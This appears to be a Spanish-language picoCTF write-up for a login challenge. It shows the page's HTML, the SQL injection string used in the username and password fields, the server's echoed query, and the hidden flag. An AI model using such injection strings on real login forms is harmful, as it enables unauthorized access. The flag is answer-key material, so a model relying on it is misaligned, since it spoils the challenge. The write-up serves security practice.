**Reto**
	
**Descripción**
	Can you login to this website? Try to login [here](http://saturn.picoctf.net:50084/).

**Solución**
	1. Una vez en el sitio se infiere por el titulo del reto que debe ser SQL Injection
		1.1. http://saturn.picoctf.net:50084/
			<html><head>
			    <title>Login</title>
			    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
			</head>
			<body>
			<div class="container">
			    <div class="row">
			        <div class="col-md-12">
			            <div class="panel panel-primary" style="margin-top:50px">
			                <div class="panel-heading">
			                    <h3 class="panel-title">Log In</h3>
			                </div>
			                <div class="panel-body">
			                    <form action="login.php" method="POST">
			                        <fieldset>
			                            <div class="form-group">
			                                <label for="username">Username:</label>
			                                <input type="text" id="username" name="username" class="form-control">
			                            </div>
			                            <div class="form-group">
			                                <label for="password">Password:</label>
			                                <div class="controls">
			                                    <input type="password" id="password" name="password" class="form-control">
			                                </div>
			                            </div>
			                            <input type="hidden" name="debug" value="0">
			                            <div class="form-actions">
			                                <input type="submit" value="Login" class="btn btn-primary">
			                            </div>
			                        </fieldset>
			                    </form>
			                </div>
			            </div>
			        </div>
			    </div>
			</div>
			</body></html>
		1.2. Por lo tanto se procede a hacer un "' or 1 = = 1;" http://saturn.picoctf.net:50084/login.php donde también se necesita inspeccionar el código etiquetado ya que la bandera se encuentra oculta en el mismo
			<html>
				<head></head>
				<body>
					<pre>
						username: ' or 1==1;
						password: ' or 1==1;
						SQL query: SELECT * FROM users WHERE name='' or 1==1;' AND password='' or 1==1;'
					</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1>
					<p hidden="">Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
				</body>
			</html>
**Notes**
	
**Referencias**
	